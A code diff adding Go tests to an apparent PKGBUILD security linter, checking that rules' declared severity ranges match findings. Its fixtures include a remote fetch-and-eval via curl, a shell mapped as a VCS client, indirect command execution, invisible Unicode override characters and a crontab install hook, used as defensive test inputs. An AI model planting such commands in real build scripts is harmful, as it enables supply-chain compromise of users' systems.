@@ -75,6 +75,130 @@ func TestRegistryIsWellFormed(t *testing.T) {
 		if r.Bad == "" || r.Good == "" {
 			t.Errorf("rule %s is missing a Bad/Good example", r.ID)
 		}
+		// MaxSeverity is only meaningful above Severity: Severities() reads
+		// anything at or below it as "unset", so a MaxSeverity that does not
+		// escalate is silently ignored rather than wrong on the page.
+		if r.MaxSeverity != 0 && r.MaxSeverity <= r.Severity {
+			t.Errorf("rule %s sets MaxSeverity %s at or below Severity %s; drop it or raise it",
+				r.ID, r.MaxSeverity, r.Severity)
+		}
+	}
+}
+
+// TestRuleSeveritiesAreDeclared keeps Rule.Severity and Rule.MaxSeverity in
+// step with the checks. They are hand-written declarations about code that
+// picks a severity per finding, so nothing but a test stops them drifting when
+// a check grows a branch — and the rule reference publishes them as fact.
+//
+// Every finding a rule's own examples produce must land inside that rule's
+// declared range. Examples cover the branch each was written for; the rules
+// that escalate are pinned at both ends by TestEscalatingRulesReachBothEnds.
+func TestRuleSeveritiesAreDeclared(t *testing.T) {
+	index := map[string]Rule{}
+	for _, r := range Registry() {
+		index[r.ID] = r
+	}
+	within := func(t *testing.T, findings []Finding) {
+		t.Helper()
+		for _, f := range findings {
+			r, ok := index[f.RuleID]
+			if !ok {
+				t.Errorf("finding for unregistered rule %s", f.RuleID)
+				continue
+			}
+			if s := r.Severities(); f.Severity < s.Low || f.Severity > s.High {
+				t.Errorf("%s reported %s, outside its declared %s..%s: %s",
+					f.RuleID, f.Severity, s.Low, s.High, f.Message)
+			}
+		}
+	}
+	for _, r := range Registry() {
+		t.Run(r.ID, func(t *testing.T) {
+			within(t, lint(t, packageFor(r.ID, "bad", r.Bad)))
+			within(t, lint(t, packageFor(r.ID, "good", r.Good)))
+		})
+	}
+}
+
+// TestEscalatingRulesReachBothEnds pins the rules that report more than one
+// severity. Containment alone cannot catch a range that is too wide: a rule
+// declared warn..critical that in fact only ever reports warn passes every
+// other check here while overstating itself on the rule reference. So each
+// entry below drives the rule to both ends of what it declares, and the list
+// must name every rule whose range varies — a new escalation gets a fixture,
+// not a free pass.
+func TestEscalatingRulesReachBothEnds(t *testing.T) {
+	// low and high are packages that should drive the rule to the bottom and
+	// the top of its declared range.
+	cases := map[string]struct{ low, high map[string]string }{
+		"PB108": {
+			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "PACKAGER='Someone <a@b.c>'")},
+			high: map[string]string{"PKGBUILD": pkgbuildWith("", "VCSCLIENTS=('git::/bin/sh')")},
+		},
+		"PB208": {
+			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  bundle install\n}")},
+			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  gem install rails\n}")},
+		},
+		"PB302": {
+			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  eval \"echo hi\"\n}")},
+			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  eval \"$(curl -s https://example.com/x)\"\n}")},
+		},
+		"PB306": {
+			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  $(printf make) all\n}")},
+			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  ${!runner} all\n}")},
+		},
+		"PB309": {
+			// U+200B ZERO WIDTH SPACE, then U+202E RIGHT-TO-LEFT OVERRIDE.
+			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make​ all\n}")},
+			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make‮ all\n}")},
+		},
+		"PB502": {
+			low: map[string]string{
+				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
+				"demo.install": "post_install() {\n  systemctl enable demo.service\n}\n",
+			},
+			high: map[string]string{
+				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
+				"demo.install": "post_install() {\n  crontab /usr/share/demo/cron\n}\n",
+			},
+		},
+	}
+
+	for _, r := range Registry() {
+		s := r.Severities()
+		_, pinned := cases[r.ID]
+		if s.Varies() != pinned {
+			t.Errorf("%s declares %s..%s but %s in TestEscalatingRulesReachBothEnds",
+				r.ID, s.Low, s.High, map[bool]string{true: "is pinned", false: "is not pinned"}[pinned])
+		}
+	}
+
+	// reports asserts the rule fires on files and that want is among the
+	// severities it reports there.
+	reports := func(t *testing.T, id string, files map[string]string, want Severity) {
+		t.Helper()
+		var got []Severity
+		for _, f := range lint(t, files) {
+			if f.RuleID == id {
+				got = append(got, f.Severity)
+				if f.Severity == want {
+					return
+				}
+			}
+		}
+		t.Errorf("%s: want a %s finding, got %v", id, want, got)
+	}
+	for id, tc := range cases {
+		r, ok := RuleByID(id)
+		if !ok {
+			t.Errorf("unknown rule %s", id)
+			continue
+		}
+		t.Run(id, func(t *testing.T) {
+			s := r.Severities()
+			reports(t, id, tc.low, s.Low)
+			reports(t, id, tc.high, s.High)
+		})
 	}
 }
 
